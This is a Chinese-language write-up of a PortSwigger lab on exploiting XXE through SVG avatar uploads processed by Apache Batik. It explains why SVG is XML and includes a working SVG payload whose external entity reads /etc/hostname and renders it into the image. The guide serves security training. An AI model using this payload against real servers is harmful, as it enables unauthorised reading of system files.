# 通过图像文件上传利用XXE漏洞   WP

来源：portswigger

题目描述：

该LAB允许用户在评论中附加头像，并使用 apache batic库处理头像图像文件。

要完成LAB，请上传一张显示文件 `/etc/hostname` 处理后内容的图片，然后使用“submit solution”提交服务器主机名的值。

##### hint:

SVG图像格式采用XML。

https://portswigger.net/academy/labs/launch/5d6e610406b1df6c657e111df6297e961a822a0428f00db9f7e7276f4a671a14?referrer=%2fweb-security%2fxxe%2flab-xxe-via-file-upload



> 某些应用程序允许用户上传文件，这些文件随后在服务器端进行处理。常见的文件格式采用XML或包含XML子组件。基于XML的格式示例包括办公文档格式（如DOCX）和图像格式（如SVG）。
>
> 例如，某个应用程序可能允许用户上传图像，并在上传后于服务器端对这些图像进行处理或验证。即使该应用程序预期接收的是PNG或JPEG等格式，其所使用的图像处理库却可能支持SVG图像。由于SVG格式采用XML编码，攻击者可提交恶意SVG图像，从而触发隐藏的攻击面，利用XXE漏洞实施攻击。

#### 原理：

SVG图像是一种基于 XML的图像格式，而不是像JPG,PNG那样的二进制位图。

关键特性：

1. SVG本质是 XML

   - 可以包含 `<?xml ...?>`
   - 可以定义 `<!DOCTYPE>`和实体（ENTITY）

2. SVG 会被服务器端解析

   该实验中服务器使用 apache batik解析SVG

3. 如果XML解析器为禁用外部实体

   就会触发XXE

##### 攻击链条：

```
SVG 上传
↓
Apache Batik 解析 XML
↓
外部实体 xxe 被解析
↓
file:///etc/hostname 被读取
↓
内容被渲染为 SVG 文本
↓
你在页面看到主机名
```



##### 具体操作步骤：

1. 再本地创建 SVG文件

2. 写入：

   ```svg
   <?xml version="1.0" standalone="yes"?>
   <!DOCTYPE test [
     <!ENTITY xxe SYSTEM "file:///etc/hostname">
   ]>
   <svg width="128px" height="128px"
        xmlns="http://www.w3.org/2000/svg"
        version="1.1">
     <text font-size="16" x="0" y="16">&xxe;</text>
   </svg>
   
   ```

   | 部分                                          | 作用                       |
   | --------------------------------------------- | -------------------------- |
   | `<!ENTITY xxe SYSTEM "file:///etc/hostname">` | 定义外部实体，读取系统文件 |
   | `&xxe;`                                       | 引用该实体                 |
   | `<text>`                                      | 将文件内容渲染到图片上     |



上传该svg文件当作头像，就可以看到hostname了：

![image-20251227193401836](C:\Users\赵念\AppData\Roaming\Typora\typora-user-images\image-20251227193401836.png)